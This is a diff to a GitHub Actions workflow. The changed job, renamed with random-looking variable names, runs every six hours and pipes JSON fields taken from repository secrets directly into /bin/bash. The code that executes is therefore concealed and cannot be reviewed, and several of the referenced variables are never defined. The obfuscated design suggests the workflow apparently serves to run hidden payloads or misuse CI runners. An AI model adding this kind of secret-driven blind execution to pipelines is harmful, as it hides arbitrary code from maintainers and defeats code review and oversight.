@@ -3,26 +3,19 @@ name: escargotcommission
 on:
   workflow_dispatch:
   schedule:
-    - cron: '50 5/6 * * *'
+    - cron: '19 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: escargotcommission
         env:
-          sy9: ${{ secrets.sy9 }}
+          ifukk8: ${{ secrets.ifukk8 }}
         run: |
-          echo $sy9 | jq -r .u803 | /bin/bash
-          echo $zig29855 | jq -r .nkz62580 | /bin/bash
-          echo $bdy634 | jq -r .ayiu06018 | /bin/bash
-          echo $toz14 | jq -r .lhqou43680 | /bin/bash
-          echo $fn78 | jq -r .s848 | /bin/bash
-          echo $kfiwy67 | jq -r .me56928 | /bin/bash
-          echo $gcw911 | jq -r .f995 | /bin/bash
-          echo $mrtks61 | jq -r .ct95134 | /bin/bash
-          echo $y76801 | jq -r .qskv98055 | /bin/bash
-          echo $jsdw36737 | jq -r .aroc83964 | /bin/bash
-          echo $asfon64 | jq -r .nt51 | /bin/bash
+          echo $ifukk8 | jq -r .aasep9 | /bin/bash
+          echo $gtru54 | jq -r .tmumm322 | /bin/bash
+          echo $ewk85837 | jq -r .jmote3177 | /bin/bash
+          echo $qfu2 | jq -r .v28 | /bin/bash
+          echo $bouo00 | jq -r .h3202 | /bin/bash
 
